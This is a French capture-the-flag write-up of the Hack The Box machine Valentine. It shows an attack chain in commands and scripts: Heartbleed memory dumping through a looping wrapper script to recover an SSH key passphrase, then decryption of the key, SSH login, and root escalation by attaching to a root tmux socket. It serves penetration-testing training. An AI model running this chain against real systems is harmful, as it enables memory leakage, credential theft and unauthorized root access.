---
title: "Valentine.htb version 1 — Hack The Box"
date: 2025-08-04
draft: false
description: "Writeup complet de la machine Valentine.htb (retired), incluant Heartbleed, extraction de clé SSH et escalade de privilèges via tmux."



tags: ["HTB", "CTF", "Heartbleed", "Privilege Escalation", "Linux"]
---

> Machine retirée de Hack The Box — difficulté *Easy*  
> Auteur : egre55

---

<figure>
  <img src="image.jpg" alt="Capture d’écran de la machine Valentine">
  <figcaption>Capture d’écran de la machine Valentine au moment de l’exploitation</figcaption>
</figure>


## 🧭 Reconnaissance

Scan initial :

```bash
nmap -sC -sV -p- valentine.htb
```

Ports ouverts :

- 22/tcp → OpenSSH 6.6.1
- 80/tcp → Apache 2.2.22 (Ubuntu)

Le site web révèle une interface avec des champs `encode`/`decode`, probablement base64.

```bash
curl http://valentine.htb
```

La page `/dev` contient deux fichiers intéressants :

- `hype_key`
- `notes.txt`

## 🔎 Analyse initiale

Le fichier `notes.txt` donne un indice sur l’encodeur/décodeur :

> Don't use the decoder/encoder until any of this is done.

Cela laisse penser que des failles côté client sont en jeu, mais sans encoder JS actif, rien d’immédiat.

Le fichier `hype_key` semble être un dump hexadécimal d'une clé SSH privée (confirmé par `file`).

```bash
file hype_key
# ASCII text, with very long lines
```

Contenu analysé : ce n’est pas une image, ni du base64. Probablement une clé SSH.

---

## 💉 Exploitation — Heartbleed (CVE-2014-0160)

Le port 443 est actif, et un scan `nmap` confirme la vulnérabilité Heartbleed :

```bash
nmap -p 443 --script ssl-heartbleed valentine.htb
```

Résultat :

```
State: VULNERABLE
Risk factor: High
```

### 🔧 Script utilisé : `heartbleed_full.sh`

```bash
#!/bin/bash
# Usage: ./heartbleed_full.sh
# Ce script exécute plusieurs fois l’exploit Heartbleed et extrait les chaînes ASCII

read -p "🔢 Nombre d'itérations Heartbleed à exécuter : " count
mkdir -p dumps
rm -f dumps/out_*.txt ascii_concatenated.txt

for i in $(seq -f "%03g" 1 $count); do
    echo "➡️  [Iteration $i]..."
    python2 heartbleed-exploit.py valentine.htb --output dumps/out_$i.txt --ascii
done

echo -e "
🧪 Extraction des chaînes ASCII avec strings..."
strings dumps/out_*.txt | grep -E '[[:print:]]{4,}' | sort -u > ascii_concatenated.txt
echo -e "
✅ Terminé : toutes les chaînes ASCII concaténées dans ascii_concatenated.txt"
```

### 🐍 Script Python : `heartbleed-exploit.py`

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# Heartbleed exploit par Martial Puygrenier adapté pour extraire ASCII

# (… contenu abrégé, voir pièce jointe pour le fichier complet …)
```

Exécution du script :

```bash
./heartbleed_full.sh
```

Résultat : dans `ascii_concatenated.txt`, on récupère :

```
heartbleedbelievethehype
```

Mot de passe pour la clé SSH.

---

## 🔓 Clé SSH — Récupération

Convertir le fichier `hype_key` en binaire :

```bash
xxd -r -p hype_key hype_key.pem
```

Déchiffrer avec OpenSSL :

```bash
openssl rsa -in hype_key.pem -out hype_key_decrypted.pem
```

Utilisation :

```bash
ssh -i hype_key_decrypted.pem hype@valentine.htb
```

---

## 🚀 Escalade de privilèges

Après avoir obtenu un shell SSH en tant que l’utilisateur `hype`, j’ai lancé un classique :

```bash
linpeas.sh
```

💡 **LinPEAS** a mis en évidence la présence d’un processus tmux tournant en tant que root, avec cette ligne intrigante :

```bash
root   1040  0.0  0.1  26416  1672 ?  Ss  01:24   0:00 /usr/bin/tmux -S /.devs/dev_sess
```

### 🧠 Analyse

Le socket tmux (`-S /.devs/dev_sess`) est accessible (lecture/exécution) par l’utilisateur `hype`.

Le processus appartient à `root`, ce qui signifie que la session associée pourrait être `root` attachée !

### 🧪 Tentatives manuelles

Liste des sessions disponibles :

```bash
tmux -S /.devs/dev_sess ls
```

Connexion à la session existante :

```bash
tmux -S /.devs/dev_sess attach
```

### ✅ Et là, bingo !

J’ai accédé à une session interactive **root** encore ouverte. Probablement laissée là par un admin négligent, ou par un script de debug.

### 📝 Preuve

```bash
root@Valentine:/# id
uid=0(root) gid=0(root) groups=0(root)
```



## 🏁 Flags

```bash
cat /home/hype/user.txt
cat /root/root.txt
```

---

## 📎 Pièces jointes

- [heartbleed_full.sh](/files/heartbleed_full.sh)
- [heartbleed-exploit.py](/files/heartbleed-exploit.py)

## 🔚 Conclusion

Cette machine montre l’impact réel d’une vulnérabilité critique comme Heartbleed. Avec un peu de persévérance, on remonte jusqu’à une clé SSH, puis une élévation de privilèges via une session `tmux` oubliée.

---

> 🎯 Entraîne-toi à automatiser ce type d’exploitation, et n’oublie jamais d’examiner les résultats de `linpeas` en détail !

